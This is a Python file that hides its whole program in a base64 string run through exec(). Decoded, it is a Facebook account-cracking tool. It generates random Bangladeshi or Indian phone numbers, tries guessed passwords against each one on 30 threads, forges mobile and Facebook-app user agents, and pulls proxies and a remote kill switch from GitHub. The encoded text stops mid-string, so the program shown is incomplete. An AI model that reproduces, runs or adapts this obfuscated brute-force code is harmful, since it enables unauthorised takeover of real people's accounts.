#
import base64
exec(base64.b64decode("aW1wb3J0IGJzNCxqc29uLHN5cyxyYW5kb20sZGF0ZXRpbWUsdGltZSxyZSxzdWJwcm9jZXNzLHBsYXRmb3JtLHN0cnVjdA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgc29wDQppbXBvcnQgb3MNCmltcG9ydCByYW5kb20NCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmltcG9ydCB1dWlkDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgcw0KaW1wb3J0IG9zLHN5cyx0aW1lLGpzb24scmFuZG9tLHJlLHN0cmluZyxwbGF0Zm9ybSxiYXNlNjQsdXVpZCx6bGliLHN1YnByb2Nlc3MNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmZyb20gcGlwLl92ZW5kb3IgaW1wb3J0IHJlcXVlc3RzIGFzIHJlcXVlc3RzDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRyZWQNCmltcG9ydCBtZWNoYW5pemUNCmZyb20gdXJsbGliIGltcG9ydCByZXF1ZXN0IGFzIHJlcQ0KZnJvbSB6bGliIGltcG9ydCBkZWNvbXByZXNzIGFzIGRlYw0KZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3INCnNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQpsb29wID0gMA0Kb2s9MA0KY3A9MA0Kb2tzID0gW10NCmNwcyA9IFtdDQppZD1bXQ0KdHdmPVtdDQp1Z2VuPVtdDQp1Z2VuMj1bXQ0KdWdlbnQgPSBbXQ0KbWV0aG9kcz1bXQ0KYW5kcm9pZF9tb2RlbHM9W10NCnRyeToNCiBwcm94PSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS9Qcm8tTWF4LTQyMC9BcGkvYmxvYi9tYWluL3Byb3gudHh0JykudGV4dA0KIG9wZW4oJy5wcm94LnR4dCcsJ3cnKS53cml0ZShwcm94KQ0KZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KIHByaW50KCcnKQ0KcHJveD1vcGVuKCcucHJveC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQ0KIy0tLS0tLS0tLS1bU0lNIElQIENPVU5UUlldLS0tLS0tLS0tLSMNCmRlc2ggPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly9pcC1hcGkuY29tL2pzb24vIikuanNvbigpWyJjb3VudHJ5Il0NCiMtLS0tLS0tLS0tLS0tLS0tLS1bIFVTRVIgQUdFTlQgXS0tLS0tLS0tLS0tLS0tLS0tLS0jDQpsaW5rc3MgPSB6bGliLmRlY29tcHJlc3MoYid4XHg5Y1x4MDVceGMxS1x4MGVceDgwIFx4MGNceDA1XHhjMFx4MTNJXVx4YjByXHhlYlx4ZGU7XHgxNFx4ZDJgQ1x4ZjhceGE0fURceGJkXHhiZDM3MFx4ZmQgMn5CUVx4ZGMrLVx4MTdceGNiXHhhM0M6Qlx4MWVceDhkLlx4YWRceDFhXHhmN1x4YjhceDlkX1x4MTJceGEzXHhjOVx4YjlyXHgxMVx4YTdceGM2XHhkYVx4YzlhXHhkYVx4OGJceDA3XHhiY1x4ZjhceDAxXHhmNFZceDFiaycpDQp0cnk6DQogICAgeHggPSByZXF1ZXN0cy5nZXQobGlua3NzKS50ZXh0LnNwbGl0bGluZXMoKSMNCiAgICBmb3IgbGluZSBpbiB4eDoNCiAgICAgICAgYW5kcm9pZF9tb2RlbHMuYXBwZW5kKGxpbmUpDQpleGNlcHQ6cGFzcw0KIy0tLS0tLS0tLS0tLS0tLS0tLVsgQ09MT1VSUyBdLS0tLS0tLS0tLS0tLS0tLS0tLSMNCkFBID0gIlwwMzNbMTs5MW0iDQpCQiA9ICJcMDMzWzE7OTJtIg0KQ0MgPSAiXDAzM1sxOzkzbSINCkREID0gIlwwMzNbMTs5NG0iDQpFRSA9ICJcMDMzWzE7OTVtIg0KRkYgPSAiXDAzM1sxOzk2bSINCkdHID0gIlwwMzNbMTs5N20iDQpISCA9ICJcMDMzWzE7OTBtIg0KQUMgPSAiXDAzM1sxOzQxbSINCkJDID0gIlwwMzNbMTswbSINCmxvb29vcCA9IDANCm9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA5MzQwMjUxOTkwNCIpDQpvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwOTQ1NDI2NjI0NTkiKQ0Kb3Muc3lzdGVtKCdjbGVhcicpDQppbXBvcnQgZ2V0cGFzcw0KDQphdHRlbXBzID0gMA0KDQp3aGlsZSBhdHRlbXBzIDwgMTIzNDU2Nzc5MDE6DQogICAgICB1c2VybmFtZSA9IGlucHV0KCdFTlRFUiBVU0VSTkFNRSA6JykNCiAgICAgIHBhc3N3b3JkID0gaW5wdXQoJ0VOVEVSIFBBU1NXT1JEIDonKQ0KICAgICAgDQogICAgICBpZiB1c2VybmFtZSA9PSAnMScgYW5kIHBhc3N3b3JkID09ICcyJzoNCiAgICAgICAgIHByaW50KCdZb3UgSGF2ZSBTdWNjZXNzZnVsbHkgTG9nZ2VkIGluLicpDQogICAgICAgICBicmVhayANCiAgICAgIGVsc2U6DQogICAgICAgICAgcHJpbnQoJ2luY2NyZWN0IHBsYXNzZSB0eXBlJykNCiAgICAgICAgICBhdHRlbXBzICs9IDENCiAgICAgICAgICBjb250aW51ZSANCm9zLnN5c3RlbSgnY2xlYXInKQ0KZGVmIF9fYmFubmVyX19fKCk6DQogICAgcHJpbnQoZiIiIg0KXDAzM1szMTsxbeKVlOKVpuKVl+KVlOKVkOKVl+KVpiDilabilZTilZDilZfilZTilabilZfilaYgIOKUgOKUkCDilKwgIOKVpiDilabilabilZDilZfilabilZTilabilZfilZTilZDilZfilaYg4pWm4pWU4pWQ4pWXDQpcMDMzWzMyOzFt4pWR4pWR4pWR4pWg4pWQ4pWj4pWg4pWQ4pWj4pWg4pWQ4pWjIOKVkeKVkeKVkSAg4pSM4pS04pSs4pSYICDilaDilZDilaPilaDilabilZ3ilZEg4pWR4pWR4pWRIOKVkeKVmuKVpuKVneKVkeKVoyANClwwMzNbMzM7MW3ilakg4pWp4pWpIOKVqeKVqSDilanilakg4pWp4pWQ4pWp4pWd4pWpICDilLQg4pSU4pSAICDilakg4pWp4pWp4pWa4pWQ4pWp4pWQ4pWp4pWd4pWa4pWQ4pWdIOKVqSDilZrilZDilZ0NClx4MWJbMzg7NTs0Nm1fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KIFwwMzNbMTszMW1bXDAzM1sxOzMybVtIXVwwMzNbMTszMW1dXDAzM1sxOzMybSBERVZFTE9QRVIgOiBBUklZQU4gSFJJRE9ZRSANCiBcMDMzWzE7MzFtW1wwMzNbMTszMm1bUl1cMDMzWzE7MzFtXVwwMzNbMTszMm0gREVWRUxPUEVSIDogTUQgTUFIQURJDQogXDAzM1sxOzMxbVtcMDMzWzE7MzJtW0ldXDAzM1sxOzMxbV1cMDMzWzE7MzJtIEZBQ0VCT09LICA6IEFSSVlBTiBIUklET1lFIA0KIFwwMzNbMTszMW1bXDAzM1sxOzMybVtEXVwwMzNbMTszMW1dXDAzM1sxOzMybSBHSVRIVUIgICAgOiBNQUhBREktSFJJRE9ZRQ0KIFwwMzNbMTszMW1bXDAzM1sxOzMybVtPXVwwMzNbMTszMW1dXDAzM1sxOzMybSBUT09MUyAgICAgOiBSRU5ET00NCiBcMDMzWzE7MzFtW1wwMzNbMTszMm1bWV1cMDMzWzE7MzFtXVwwMzNbMTszMm0gVkVSU0lPTiAgIDogXDAzM1sxOzMxbVtWLjE5XQ0KXDAzM1sxOzkybeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KDQpcMDMzWzE7OTFtPOKVkOKVkOKVkFwwMzNbMTs0MW1cMDMzWzE7OTdtIFRISVMgTkFNRSBJUyBNQUhBREl4SFJJRE9ZRSBCUkFORFwwMzNbOzBtXDAzM1sxOzkxbeKVkOKVkOKVkD5cMDMzWzE7OTJtIiIiKQ0Kb3Muc3lzdGVtKCdjbGVhcicpDQpwcmludCgnXDAzM1sxOzM3bUltcG9ydGluZyBNb2R1bGVzLi4uJykNCnRpbWUuc2xlZXAoNSkNCm9zLnN5c3RlbSgnY2xlYXInKQ0KdHJ5Og0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXNlcnYgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ITS1YRC00MjgvU0VSVkVSL21haW4vTUFJTi1TRVJWJykudGV4dA0KCWlmICJtYWluIiBpbiBzZXJ2Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJX19iYW5uZXJfX18oKQ0KCQlwcmludChmJ1wwMzNbMTs5Nm1bXDAzM1sxOzk1bT5cMDMzWzE7OTRtK1wwMzNbMTs5NW08XDAzM1sxOzk2bV0gXDAzM1sxOzkybU1BSU5URU5BTkNFIEJSRUFLIFxuJykNCgkJc3lzLmV4aXQoKQ0KCWlmICJvZmYiIGluIHNlcnY6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludChsb2dvKQ0KCQlwcmludChmJ1wwMzNbMTs5Nm1bXDAzM1sxOzk1bT5cMDMzWzE7OTRtK1wwMzNbMTs5NW08XDAzM1sxOzk2bV0gXDAzM1sxOzkybVRPT0wgSVMgT0ZGIE5PVyAnKQ0KCQlzeXMuZXhpdCgpDQoJaWYgInVwIiBpbiBzZXJ2Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJX19iYW5uZXJfX18oKQ0KCQlwcmludCgnXDAzM1sxOzk2bVtcMDMzWzE7OTVtPlwwMzNbMTs5NG0rXDAzM1sxOzk1bTxcMDMzWzE7OTZtXSBcMDMzWzE7OTJtVE9PTCBVUERBVElORyBcblxuJykNCgkJc3lzLmV4aXQoKQ0KCWlmICJzZXJ2IiBpbiBzZXJ2Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQobG9nbykNCgkJcHJpbnQoJ1wwMzNbMTs5Nm1bXDAzM1sxOzk1bT5cMDMzWzE7OTRtK1wwMzNbMTs5NW08XDAzM1sxOzk2bV0gXDAzM1sxOzkybVNFUlZFUiBJUyBPRkYnKQ0KCQlzeXMuZXhpdCgpDQpleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJcHJpbnQoIkZJWCBZT1VSIElOVEVSTkVUIEJSVUgiKQ0KCXN5cy5leGl0KCkNCmRlZiBheXNoYSgpOg0KICAgICAgICBwcmludCgiXDAzM1swOzM0beKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpDQptZXRob2Q9W10gDQpkZWYgbWFpbigpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIF9fYmFubmVyX19fKCkNCiAgICMjIHByaW50KGYiXDAzM1sxOzM3bVtcMDMzWzE7OTJtMVwwMzNbMTszN21dIFwwMzNbMTs5Mm1GSUxFIENSQUNLSU5HICIpDQogICAgcHJpbnQoZiJcMDMzWzE7MzdtW1wwMzNbMTs5Mm0xXDAzM1sxOzM3bV0gXDAzM1sxOzkybVJBTkRPTSBDUkFDSyAiKQ0KICAgIHByaW50KGYiXDAzM1sxOzM3bVtcMDMzWzE7OTJtMlwwMzNbMTszN21dIFwwMzNbMTs5Mm1JTkRJQSBDUkFDSyIpDQogICAgIyBwcmludChmIlwwMzNbMTszN21bXDAzM1sxOzM2bUVcMDMzWzE7MzdtXSBcMDMzWzE7MzdtQ09OVEFDVCBXSVRIIENSRUFUT1IgIikNCiAgICBwcmludChmIlwwMzNbMTszN21bXDAzM1sxOzkybUVcMDMzWzE7MzdtXSBcMDMzWzE7OTJtRVhJVCAiKQ0KICAgIGF5c2hhKCkNCiAgICBEeEg9IGlucHV0KCdcMDMzWzE7MzdtW1wwMzNbMTs5Mm0+XDAzM1sxOzM3bV0gXDAzM1sxOzkybVNFTEVDVCA6ICcpDQogICAgaWYgRHhIIGluIFsnNCcsJzAxJywnQScsJ2EnXToNCiAgICAgICAgX19fbWl4X19fKCkNCiAgICBlbGlmIER4SCBpbiBbJzEnLCcwMicsJ0InLCdiJ106DQogICAgICAgIF9fX21peF9fXygpDQogICAgZWxpZiBEeEggaW4gWycyJywnMDMnLCdDJywnYyddOg0KICAgICAgICBfX2luZF9fKCkNCiAgICBlbGlmIER4SCBpbiBbJzQnLCcwNCcsJ0QnLCdkJ106DQogICAgICAgIF9faW5kX18oKQ0KICAgIGVsaWYgRHhIIGluIFsnMCcsJzAwJywnRScsJ2UnXToNCiAgICAgICAgZXhpdCgpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuXDAzM1sxOzkxbVt4XSBDaG9vc2UgdmFsaWQgb3B0aW9uIC4uLiAnKTtEeEgoKQ0KDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCiMjIyMjIyMjIyMjLS0tUkFORE9NLS0tIyMjIyMjIyMjDQpkZWYgX19fbWl4X19fKCk6DQogICAgdXNlcj1bXQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIF9fYmFubmVyX19fKCkNCiAgICAjLiBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludCgnXDAzM1sxOzkybVs8Pl0gQkQgU0lNIENPREUgOiBcMDMzWzE7OTJtIDAxNywwMTgsMDE5LDAxNiAnKQ0KICAgICMgcHJpbnQoJ1wwMzNbMTszM21bPl0gSU5EIFNJTSBDT0RFIDogXDAzM1sxOzMybVsgKzkxNjM3ICs5MTcwNCArOTE3OTMgXScpDQojb3Muc3lzdGVtIygieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA5NDU0MjY2MjQ1OSIpDQogICAgY29kZSA9IGlucHV0KCdcMDMzWzE7OTJtWz5dIFNFTEVDVCA6ICcpDQogICMgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2dpdGh1Yi5jb20vRHhILTIxMicpDQogICAgcHJpbnQoKQ0KICAgIHByaW50KCdcMDMzWzE7OTJtWzw+XSBFWEFNUExFIDogXDAzM1sxOzMybTEwMDAsMjAwMCw1MDAwLDEwMDAwLDIwMDAwJykNCiAgICBsaW1pdCA9IGludChpbnB1dCgnXDAzM1sxOzkybVs+XSBMSU1JVCA6ICcpKQ0KICAgICMuICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwOTMyNDE3NjM4OTcnKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQ0KICAgICAgICBpZC5hcHBlbmQobm1wKQ0KICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgX19fbWFsX19fOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgX19iYW5uZXJfX18oKQ0KICAgICAgICB0bCA9IGxlbih1c2VyKSANCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7OTJtW35dXDAzM1sxOzkybSBUT1RBTCBDUkFDSyBcMDMzWzE7OTJtIDoge2xpbWl0fSIpDQogICAgICAgIHByaW50KCdcMDMzWzE7OTJtW35dXDAzM1sxOzkybSBTSU0gQ09ERVwwMzNbMTs5Mm0gICAgIDogJytjb2RlKQ0KICAgICAgICMgIHByaW50KCdcMDMzWzE7MzdtW8OXXVwwMzNbMTszNm0gVVNFIEFQTiBGT1IgQkVUVEVSIFJFU1VMVCcpDQogICAgICAgIGF5c2hhKCkNCiAgICAgICAgZm9yIGxvdmUgaW4gaWQ6DQogICAgICAgICAgIGlkcyA9IGNvZGUrbG92ZSAjMTFkaWdpdCArIHVpZA0KICAgICAgICAgICB2dSA9IGxvdmVbOjZdICM2ZGlnaXQNCiAgICAgICAgICAgYXUgPSBsb3ZlWzo3XSAjN2RpZ2l0IHwgbG92ZSBtYW5lIDhkaWdpdCANCiAgICAgICAgICAgYnUgPSBpZHNbOjhdICMxc3QgOGRpZ2l0DQogICAgICAgICAgIHB3diA9IFtsb3ZlLGF1LGJ1LCJtYWhhZGkiLCIxMDIwMzAiLCI3MDgwOTAiLCIyMDMwNDAiLCJocmlkb3llIiwiYXJpeWFuIiwibmF6bWluIiwiZGV2aWwiLCJhbGFtaW4iLCJzYWJiaXIiLCJzaGFraWIiLCJmYXJqYW5hIiwic3VsdGFuYSIsImFmc2FuYSIsXQ0KICAgICAgICAgICBfX19tYWxfX18uc3VibWl0KF9fX21peHRfX18saWRzLHB3dix0bCkgICAgICANCiAgICBwcmludCgnJykNCiAgICBpbnB1dChmIlxuXDAzM1sxOzMybVvwn5iu4oCN8J+SqF0gQ1JBQ0sgUFJPQ0VTUyBTVUNDRVNTRlVMXG5bPl0gRVhJVCAiKQ0KICAgIGV4aXQoKSAgIA0KZGVmIF9faW5kX18oKToNCiAgICB1c2VyPVtdDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgX19iYW5uZXJfX18oKQ0KICAgICMgcHJpbnQoJ1wwMzNbMTszM21bPF0gQkQgU0lNIENPREUgOiBcMDMzWzE7MzJtWyAwMTcgMDE4IDAxOSAwMTYgXScpDQogICAgcHJpbnQoJ1wwMzNbMTszMm1bPl0gSU5EIFNJTSBDT0RFIDogXDAzM1sxOzMybSArOTE2MzcsKzkxNzA0LCs5MTc5MyAnKQ0KIy4gb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vaWFtLkR4SHJhc2hpZCIpDQogICAgY29kZSA9IGlucHV0KCdcMDMzWzE7MzJtPj4gU0VMRUNUIDogJykNCiAgIyBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9EeEgtMjEyJykNCiAgICBwcmludCgnXDAzM1sxOzMybVs8Pl0gRVhBTVBMRSA6IFwwMzNbMTszMm0xMDAwLDIwMDAsNTAwMCwxMDAwMCwyMDAwMF0nKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KCdcMDMzWzE7OTJtIFs+XSBMSU1JVCA6ICcpKQ0KICAgIy4gICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwOTMyNDE3NjM4OTcnKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQ0KICAgICAgICBpZC5hcHBlbmQobm1wKQ0KICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgX19fbWFsX19fOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgX19iYW5uZXJfX18oKQ0KICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpIA0KICAgICAgICBwcmludChmIlwwMzNbMTszN21bw5ddXDAzM1sxOzM3bSBUT1RBTCBDUkFDSyBcMDMzWzE7MzZtIDoge2xpbWl0fSIpDQogICAgICAgIHByaW50KCdcMDMzWzE7MzdtW8OXXVwwMzNbMTszN20gU0lNIENPREVcMDMzWzE7MzZtICAgICA6ICcrY29kZSkNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszN21bw5ddXDAzM1sxOzM2bSBVU0UgQVBOIEZPUiBCRVRURVIgUkVTVUxUJykNCiAgICAgICAgYXlzaGEoKQ0KICAgICAgICBmb3IgbG92ZSBpbiBpZDoNCiAgICAgICAgICAgaWRzID0gY29kZStsb3ZlICMxMWRpZ2l0ICsgdWlkDQogICAgICAgICAgIHZ1ID0gbG92ZVs6Nl0gIzZkaWdpdA0KICAgICAgICAgICBhdSA9IGxvdmVbOjddICM3ZGlnaXQgfCBsb3ZlIG1hbmUgOGRpZ2l0IA0KICAgICAgICAgICBidSA9IGlkc1s6OF0gIzFzdCA4ZGlnaXQNCiAgICAgICAgICAgcHd2ID0gW2xvdmUsYXUsYnUsIjU3MjczMjAwIixdDQogICAgICAgICAgIF9fX21hbF9fXy5zdWJtaXQoX19fbWl4dF9fXyxpZHMscHd2LHRsKSAgICAgIA0KICAgIHByaW50KCcnKQ0KICAgIGlucHV0KGYiXG5cMDMzWzE7MzJtW/CfmK7igI3wn5KoXSBDUkFDSyBQUk9DRVNTIFNVQ0NFU1NGVUxcbls+XSBFWElUICIpDQogICAgZXhpdCgpICAgDQppbXBvcnQgcmFuZG9tDQppcGhvbmVfbW9kZWxzID0gWw0KICAgICJpUGhvbmUgMTIgUHJvIE1heCIsDQogICAgImlQaG9uZSAxMiBQcm8iLA0KICAgICJpUGhvbmUgMTIiLA0KICAgICJpUGhvbmUgMTIgTWluaSIsDQogICAgImlQaG9uZSBTRSAoMm5kIGdlbmVyYXRpb24pIiwNCiAgICAiaVBob25lIDExIFBybyBNYXgiLA0KICAgICJpUGhvbmUgMTEgUHJvIiwNCiAgICAiaVBob25lIDExIiwNCiAgICAiaVBob25lIFhTIE1heCIsDQogICAgImlQaG9uZSBYUyIsDQogICAgImlQaG9uZSBYUiIsDQogICAgImlQaG9uZSBYIiwNCiAgICAiaVBob25lIDggUGx1cyIsDQogICAgImlQaG9uZSA4IiwNCiAgICAiaVBob25lIDcgUGx1cyIsDQogICAgImlQaG9uZSA3IiwNCiAgICAiaVBob25lIFNFIiwNCiAgICAiaVBob25lIDZzIFBsdXMiLA0KICAgICJpUGhvbmUgNnMiLA0KICAgICJpUGhvbmUgNiBQbHVzIiwNCiAgICAiaVBob25lIDYiLA0KICAgICJpUGhvbmUgNXMiLA0KICAgICJpUGhvbmUgNWMiLA0KICAgICJpUGhvbmUgNSIsDQogICAgImlQaG9uZSA0cyIsDQogICAgImlQaG9uZSA0IiwNCiAgICAiaVBob25lIDNHUyIsDQogICAgImlQaG9uZSAzRyIsDQogICAgImlQaG9uZSIsDQogICAgImlQaG9uZSAxMSBQcm8gTWF4IiwNCiAgICAiaVBob25lIDExIFBybyIsDQogICAgImlQaG9uZSAxMSIsDQogICAgImlQaG9uZSBYUyBNYXgiLA0KICAgICJpUGhvbmUgWFMiLA0KICAgICJpUGhvbmUgWFIiLA0KICAgICJpUGhvbmUgWCIsDQogICAgImlQaG9uZSA4IFBsdXMiLA0KICAgICJpUGhvbmUgOCIsDQogICAgImlQaG9uZSA3IFBsdXMiLA0KICAgICJpUGhvbmUgNyIsDQogICAgImlQaG9uZSBTRSIsDQogICAgImlQaG9uZSA2cyBQbHVzIiwNCiAgICAiaVBob25lIDZzIiwNCiAgICAiaVBob25lIDYgUGx1cyIsDQogICAgImlQaG9uZSA2IiwNCiAgICAiaVBob25lIDVzIiwNCiAgICAiaVBob25lIDVjIiwNCiAgICAiaVBob25lIDUiLA0KICAgICJpUGhvbmUgNHMiLA0KICAgICJpUGhvbmUgNCIsDQogICAgImlQaG9uZSAzR1MiLA0KICAgICJpUGhvbmUgM0ciLA0KICAgICJpUGhvbmUiXQ0KZGVmIHVhYSgpOg0KICAgIG1vZGVsID0gcmFuZG9tLmNob2ljZXMoaXBob25lX21vZGVscylbMF0NCiAgICBpb3NfdmVyc2lvbiA9IGYie3JhbmRvbS5yYW5kaW50KDEwLCAxNCl9LntyYW5kb20ucmFuZGludCgwLCA5KX0iDQogICAgc2FmYXJpX3ZlcnNpb24gPSBmIntyYW5kb20ucmFuZGludCgxMCwgMTQpfS57cmFuZG9tLnJhbmRpbnQoMCwgOSl9LntyYW5kb20ucmFuZGludCgwLCA5KX0iDQogICAgdXNlcl9hZ2VudCA9IGYiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyB7aW9zX3ZlcnNpb259IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0L3tzYWZhcmlfdmVyc2lvbn0gKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uL3tzYWZhcmlfdmVyc2lvbn0gTW9iaWxlLzE1RTE0OCBTYWZhcmkve3NhZmFyaV92ZXJzaW9ufSIgDQogICAgcmV0dXJuIHVzZXJfYWdlbnQNCnVhYSA9IFt1YWEoKSBmb3IgXyBpbiByYW5nZSg1MDAwMCldDQpkZWYgdWFhKCk6DQogICAgYW5kX3ZlcnMgPSByYW5kb20ucmFuZGludCg0LDEzKQ0KICAgIGFuZF9tb2QgPSByYW5kb20uY2hvaWNlKGFuZHJvaWRfbW9kZWxzKQ0KICAgIGFwcF91bGQgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExLDk5OTk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoMTExLDk5OSkpDQogICAgYW5kX2lkID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMSw5OTkpKSsnLjAuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDksNDkpKStzdHIocmFuZG9tLnJhbmRpbnQoMTExLDU1NSkpDQogICAgYXBwX3ZlciA9IHN0cihyYW5kb20ucmFuZGludCg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSg5OSw5OTkpKSsnLicrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoOTksOTk5KSkNCiAgICBhcHBfdmVyY29kZSA9IHN0cihyYW5kb20ucmFuZGludCgwMDAwMDAwMDAsOTk5OTk5OTk5KSkNCiAgICBwa2dfbmFtZSA9IHJhbmRvbS5jaG9pY2UoKCdjb20uZmFjZWJvb2suYWRzbWFuYWdlcicsJ2NvbS5mYWNlYm9vay5saXRlJywnY29tLmZhY2Vib29rLm9yY2EnLCdjb20uZmFjZWJvb2sua2F0YW5hJykpDQogICAgdWEgPSAnRGFsdmlrLzIuMS4wIChMaW5leDsgVTsgQW5kcm9pZCB7YW5kX3ZlcnN9OyBTYW1zdW5nIHM1IEJ1aWxkL09QTTcue2FwcF91bGR9KSBbRkJBTi9GQjRBO0ZCQVYvMzMyLjAuMC40LjE1MjtGQkJWLzg5NjU5MzI0NztGQkRNL3tkZW5zaXR5PTMuNCx3aWR0aD0xMDgwLGhlaWdodD0xNDQ2fTtGQkxDL2VuX0dCO0ZCUlYvNDM5ODk0MjcwO0ZCQ1IvRkFTVFdFQjtGQk1GL1NhbXN1bmc7RkJCRC9zYW1zdW5nO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0dhbGF4eSBTNTtGQlNWLzExO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTo7XScNCiAgICByZXR1cm4gdWENCmRlZiB1YWEoKToNCiAgICBhbmRfdmVycyA9IHJhbmRvbS5yYW5kaW50KDQsMTMpDQogICAgYW5kX21vZCA9IHJhbmRvbS5jaG9pY2UoYW5kcm9pZF9tb2RlbHMpDQogICAgYXBwX3VsZCA9IHN0cihyYW5kb20ucmFuZGludCgxMTExMTEsOTk5OTk5KSkrJy4nK3N0cihyYW5kb20ucmFuZGludCgxMTEsOTk5KSkNCiAgICBhbmRfaWQgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExLDk5OSkpKycuMC4wLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoOSw0OSkpK3N0cihyYW5kb20ucmFuZGludCgxMTEsNTU1KSkNCiAgICBhcHBfdmVyID0gc3RyKHJhbmRvbS5yYW5kaW50KDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoOTksOTk5KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDk5LDk5OSkpKycuJytzdHIocmFuZG9tLnJhbmRpbnQoOTksOTk5KSkrJy4nK3N0cihyYW5kb20ucmFuZGludCg5OSw5OTkpKQ0KICAgIGFwcF92ZXJjb2RlID0gc3RyKHJhbmRvbS5yYW5kaW50KDAwMDAwMDAwMCw5OTk5OTk5OTkpKQ0KICAgIHBrZ19uYW1lID0gcmFuZG9tLmNob2ljZSgoJ2NvbS5mYWNlYm9vay5hZHNtYW5hZ2VyJywnY29tLmZhY2Vib29rLmxpdGUnLCdjb20uZmFjZWJvb2sub3JjYScsJ2NvbS5mYWNlYm9vay5rYXRhbmEnKSkNCiAgICB1YSA9IGYnRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9p